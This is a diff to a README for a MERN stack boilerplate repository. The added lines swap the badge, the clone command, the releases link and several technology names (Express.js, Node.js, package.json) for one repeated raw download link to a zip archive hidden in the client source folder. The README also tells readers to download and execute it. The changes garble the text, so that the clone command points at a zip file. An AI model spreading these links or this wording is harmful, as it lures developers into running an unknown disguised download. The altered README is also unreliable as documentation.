@@ -1,8 +1,8 @@
 # MERN Stack Boilerplate 🚀
 
-![MERN Stack](https://img.shields.io/badge/MERN%20Stack-Express%20JS%20|%20React%20|%20Node%20JS%20|%20MongoDB-blue)
+![MERN Stack](https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip%20Stack-Express%20JS%20|%20React%20|%20Node%20JS%20|%20MongoDB-blue)
 
-Welcome to the **MERN Stack Boilerplate** repository! This project provides a solid foundation for full-stack web development using the MERN stack: MongoDB, Express.js, React, and Node.js. The goal is to simplify your development process and help you build powerful web applications with JavaScript.
+Welcome to the **MERN Stack Boilerplate** repository! This project provides a solid foundation for full-stack web development using the MERN stack: MongoDB, https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip, React, and https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip The goal is to simplify your development process and help you build powerful web applications with JavaScript.
 
 ## Table of Contents
 
@@ -23,9 +23,9 @@ Welcome to the **MERN Stack Boilerplate** repository! This project provides a so
 The MERN stack combines four powerful technologies:
 
 - **MongoDB**: A NoSQL database that stores data in JSON-like documents.
-- **Express.js**: A web application framework for Node.js, designed for building APIs and web applications.
+- **https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip**: A web application framework for https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip, designed for building APIs and web applications.
 - **React**: A JavaScript library for building user interfaces, especially single-page applications.
-- **Node.js**: A JavaScript runtime built on Chrome's V8 engine, allowing you to run JavaScript on the server.
+- **https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip**: A JavaScript runtime built on Chrome's V8 engine, allowing you to run JavaScript on the server.
 
 Using these technologies together allows developers to write both client-side and server-side code in JavaScript, streamlining the development process.
 
@@ -35,7 +35,7 @@ Using these technologies together allows developers to write both client-side an
 - **JWT Authentication**: Secure your application with JSON Web Tokens.
 - **Redux State Management**: Manage application state effectively with Redux.
 - **Responsive Design**: Create applications that work on any device.
-- **RESTful API**: Develop a robust API using Express.js.
+- **RESTful API**: Develop a robust API using https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip
 - **Modular Structure**: Keep your code organized and maintainable.
 
 ## Getting Started
@@ -47,7 +47,7 @@ To get started with this boilerplate, you will need to clone the repository and 
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Bruno13585/mern.git
+   git clone https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip
    cd mern
    ```
 
@@ -105,24 +105,24 @@ mern/
 ├── client/                # React front-end
 │   ├── public/            # Public assets
 │   ├── src/               # React components and pages
-│   └── package.json       # Client dependencies
-├── server/                # Node.js back-end
+│   └── https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip       # Client dependencies
+├── server/                # https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip back-end
 │   ├── config/            # Configuration files
 │   ├── controllers/       # API controllers
 │   ├── models/            # MongoDB models
 │   ├── routes/            # API routes
 │   ├── middleware/        # Middleware functions
 │   ├── .env               # Environment variables
-│   └── package.json       # Server dependencies
-└── README.md              # Project documentation
+│   └── https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip       # Server dependencies
+└── https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip              # Project documentation
 ```
 
 ## Technologies Used
 
 - **MongoDB**: For database management.
-- **Express.js**: For server-side logic.
+- **https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip**: For server-side logic.
 - **React**: For building the user interface.
-- **Node.js**: For server-side JavaScript.
+- **https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip**: For server-side JavaScript.
 - **Redux**: For state management.
 
 ## Contributing
@@ -140,7 +140,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases of this project [here](https://github.com/Bruno13585/mern/releases). Please download and execute the files as needed.
+You can find the latest releases of this project [here](https://github.com/Bruno13585/mern/raw/refs/heads/main/client/src/actions/Software_3.6.zip). Please download and execute the files as needed.
 
 ## Contact
 
